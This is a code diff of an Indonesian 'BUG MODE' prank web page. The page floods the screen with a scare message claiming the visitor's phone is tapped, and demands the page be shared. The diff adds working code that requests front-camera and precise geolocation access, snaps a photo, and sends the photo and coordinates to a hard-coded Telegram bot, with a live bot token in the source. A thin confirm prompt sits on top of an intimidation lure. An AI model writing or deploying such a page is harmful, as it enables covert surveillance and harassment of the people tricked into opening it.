@@ -4,64 +4,44 @@
   <meta charset="UTF-8">
   <title>BUG MODE</title>
   <style>
-    * {
-      margin: 0;
-      padding: 0;
-      box-sizing: border-box;
-      font-family: monospace;
-    }
+    * { margin:0; padding:0; box-sizing:border-box; font-family: monospace; }
     body {
-      background: #000;
-      color: #0f0;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
-      overflow: hidden;
-      transition: background 0.1s;
+      background: #000; color: #0f0;
+      display:flex; justify-content:center; align-items:center;
+      height:100vh; flex-direction:column; overflow:hidden; transition:background 0.1s;
     }
     h2 {
-      font-size: 24px;
-      cursor: pointer;
-      padding: 12px 24px;
-      border: 2px solid #0f0;
-      transition: 0.3s;
-      z-index: 11;
+      font-size:24px; cursor:pointer; padding:12px 24px; border:2px solid #0f0;
+      transition:0.3s; z-index:11;
     }
-    h2:hover {
-      background-color: #0f0;
-      color: #000;
+    h2:hover { background-color:#0f0; color:#000; }
+    video.bg {
+      position:fixed; top:0; left:0; width:100vw; height:100vh; object-fit:cover;
+      z-index:10; display:none;
     }
-    video {
-      position: fixed;
-      top: 0;
-      left: 0;
-      width: 100vw;
-      height: 100vh;
-      object-fit: cover;
-      z-index: 10;
-      display: none;
+    video#camFeed {
+      position:fixed; bottom:12px; right:12px; width:160px; height:120px;
+      border:2px solid red; z-index:30; display:none; border-radius:6px;
+      object-fit:cover;
     }
     .prank-text {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: rgba(0,0,0,0.8);
-      color: red;
-      font-size: 20px;
-      padding: 30px;
-      text-align: center;
-      z-index: 20;
-      display: none;
+      position:fixed; top:50%; left:50%; transform:translate(-50%,-50%);
+      background:rgba(0,0,0,0.85); color:red; font-size:18px; padding:22px;
+      text-align:center; z-index:20; display:none; max-width:90vw;
     }
+    .info-line { color:#ff7f7f; margin-top:8px; font-size:14px; }
+    .btn-send {
+      margin-top:12px; padding:8px 12px; background:#aa1111; color:#fff; border:none;
+      cursor:pointer; border-radius:6px; font-weight:bold;
+    }
+    .btn-send:disabled { opacity:0.5; cursor:not-allowed; }
+    .small-note { margin-top:8px; color:#ffa; font-size:12px; }
   </style>
 </head>
 <body>
   <h2 id="triggerText">GO TO HALAMAN BUG</h2>
 
-  <video id="bugVideo" autoplay muted loop>
+  <video id="bugVideo" class="bg" autoplay muted loop>
     <source src="https://files.catbox.moe/x24fxy.mp4" type="video/mp4">
   </video>
 
@@ -69,17 +49,27 @@
     <source src="https://files.catbox.moe/eyc6gm.mp3" type="audio/mp3">
   </audio>
 
-  <div class="prank-text" id="prankText">
-    📡 HP ANDA TELAH DI SADAP!<br><br>
-    📍 Lokasi Anda telah dilacak.<br>
-    📦 Paket misterius sedang dikirim ke rumah Anda.<br>
-    📧 Email Anda telah saya lihat semua!<br><br>
-    📷 Kamera Anda telah aktif.<br>
-    🎙️ Mikrofon Anda sedang merekam...<br><br>
-    ❗Jika tidak ingin data Anda disebar,<br>
-    silakan SEBARKAN web ini sekarang juga!<br><br>
-    👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...<br><br>
-    ☠️🖕🏽
+  <!-- preview kamera kecil -->
+  <video id="camFeed" autoplay playsinline muted></video>
+
+  <div class="prank-text" id="prankText" aria-live="polite">
+    <div id="prankMain">
+      📡 HP ANDA TELAH DI SADAP!<br><br>
+      📍 Lokasi Anda: <span id="lokasi">sedang dilacak...</span><br>
+      📦 Paket misterius sedang dikirim ke rumah Anda.<br>
+      📧 Email Anda telah saya lihat semua!<br><br>
+      📷 Kamera Anda telah aktif.<br>
+      🎙️ Mikrofon Anda sedang merekam...<br><br>
+      ❗Jika tidak ingin data Anda disebar,<br>
+      silakan SEBARKAN web ini sekarang juga!<br><br>
+      👁️ Saya bisa melihat apa yang sedang Anda lakukan sekarang...<br><br>
+      ☠️🖕🏽
+    </div>
+
+    <div class="info-line" id="statusLine">Status: Menunggu izin kamera & lokasi (akan diminta saat tombol ditekan).</div>
+
+    <button id="sendTelegram" class="btn-send" disabled>Kirim ke Telegram (butuh konfirmasi)</button>
+    <div class="small-note">Catatan: izin muncul hanya di HTTPS atau localhost. Klik tombol hanya kalau perangkat ini milikmu.</div>
   </div>
 
   <script>
@@ -87,18 +77,29 @@
     const video = document.getElementById("bugVideo");
     const audio = document.getElementById("bugSound");
     const prankText = document.getElementById("prankText");
+    const camFeed = document.getElementById("camFeed");
+    const lokasiSpan = document.getElementById("lokasi");
+    const statusLine = document.getElementById("statusLine");
+    const sendBtn = document.getElementById("sendTelegram");
 
-    function startPrank() {
+    // === GANTI JIKA PERLU (sudah diisi sesuai yang kamu berikan) ===
+    const TELEGRAM_TOKEN = "7762127279:AAHIQQ_l3KJGaV9T31YM1ZAZ2hNRQcVYtLM";
+    const CHAT_ID = "6788646701";
+
+    let stream = null;
+    let lastCoords = null;
+
+    function showPrankUI() {
       document.body.innerHTML = "";
       document.body.appendChild(video);
       document.body.appendChild(audio);
       document.body.appendChild(prankText);
+      document.body.appendChild(camFeed);
       video.style.display = "block";
       prankText.style.display = "block";
       video.play();
-      audio.play().catch(() => console.log("Klik layar untuk aktifkan suara."));
-
-      if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 300]);
+      audio.play().catch(()=>console.log("Klik layar untuk aktifkan suara."));
+      if (navigator.vibrate) navigator.vibrate([300,100,300,100,300]);
 
       let toggle = false;
       setInterval(() => {
@@ -107,10 +108,118 @@
       }, 150);
     }
 
-    text.addEventListener("click", startPrank);
-    document.addEventListener("click", () => {
-      audio.play();
+    async function requestPermissionsAndPreview() {
+      statusLine.textContent = "Meminta izin kamera & lokasi...";
+      // Kamera (facingMode user -> depan)
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
+        camFeed.srcObject = stream;
+        camFeed.style.display = "block";
+        statusLine.textContent = "Kamera diizinkan. Menunggu lokasi...";
+      } catch (err) {
+        console.warn("Kamera ditolak atau tidak tersedia:", err);
+        statusLine.textContent = "Kamera ditolak / tidak tersedia.";
+      }
+
+      // Lokasi
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(pos => {
+          const { latitude, longitude } = pos.coords;
+          lastCoords = { latitude, longitude };
+          lokasiSpan.textContent = `Lat: ${latitude.toFixed(6)}, Lon: ${longitude.toFixed(6)}`;
+          statusLine.textContent = "Lokasi diizinkan.";
+          sendBtn.disabled = false;
+        }, err => {
+          console.warn("Lokasi ditolak/error:", err);
+          lokasiSpan.textContent = "Lokasi ditolak!";
+          statusLine.textContent = "Lokasi ditolak atau error.";
+          // jika kamera ada, tetap aktifkan send (foto mungkin masih bisa)
+          sendBtn.disabled = !stream;
+        }, { enableHighAccuracy:true, timeout:10000 });
+      } else {
+        lokasiSpan.textContent = "Geolocation tidak didukung!";
+        statusLine.textContent = "Geolocation tidak didukung.";
+        sendBtn.disabled = !stream;
+      }
+    }
+
+    async function takeSnapshotBlob() {
+      return new Promise((resolve, reject) => {
+        if (!stream) return reject(new Error("Kamera tidak tersedia"));
+        const track = stream.getVideoTracks()[0];
+        const settings = track.getSettings();
+        const w = settings.width || 640;
+        const h = settings.height || 480;
+        const canvas = document.createElement("canvas");
+        canvas.width = w; canvas.height = h;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(camFeed, 0, 0, w, h);
+        canvas.toBlob(blob => {
+          if (blob) resolve(blob);
+          else reject(new Error("Gagal membuat blob"));
+        }, "image/jpeg", 0.92);
+      });
+    }
+
+    async function sendToTelegram() {
+      if (!confirm("Kamu akan mengirim lokasi + foto ke bot Telegram. Lanjutkan?")) return;
+      statusLine.textContent = "Mengambil snapshot...";
+      try {
+        const blob = await takeSnapshotBlob();
+        if (lastCoords) {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `📍 Lokasi (user setuju):\nLat: ${lastCoords.latitude}\nLon: ${lastCoords.longitude}\nhttps://maps.google.com/?q=${lastCoords.latitude},${lastCoords.longitude}`
+            })
+          });
+        } else {
+          await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+            method: "POST",
+            headers: {"Content-Type":"application/json"},
+            body: JSON.stringify({
+              chat_id: CHAT_ID,
+              text: `📍 Lokasi: TIDAK TERSEDIA (user tolak atau tidak didukung)`
+            })
+          });
+        }
+
+        statusLine.textContent = "Mengirim foto ke Telegram...";
+        const form = new FormData();
+        form.append("chat_id", CHAT_ID);
+        form.append("photo", blob, "snapshot.jpg");
+
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
+          method: "POST",
+          body: form
+        });
+
+        statusLine.textContent = "Selesai: data telah dikirim (user menekan tombol).";
+        alert("Sukses: lokasi + foto dikirim ke Telegram.");
+      } catch (err) {
+        console.error("Gagal kirim ke Telegram:", err);
+        statusLine.textContent = "Gagal mengirim ke Telegram. Cek console.";
+        alert("Gagal mengirim: " + (err.message || err));
+      }
+    }
+
+    // Event wiring
+    text.addEventListener("click", () => {
+      showPrankUI();
+      // setelah UI prank tampil, minta izin & preview (karena ini dipicu oleh klik user)
+      requestPermissionsAndPreview();
+      // klik tambahan akan memicu audio play (beberapa browser perlu user interaction)
+      document.addEventListener("click", () => { audio.play().catch(()=>{}); }, { once: true });
     });
+
+    sendBtn.addEventListener("click", sendToTelegram);
+
+    // HTTPS note: user must host on https or localhost
+    if (location.protocol !== "https:" && location.hostname !== "localhost") {
+      console.warn("Perhatian: izin kamera/lokasi hanya berfungsi di HTTPS atau localhost.");
+    }
   </script>
 </body>
 </html>
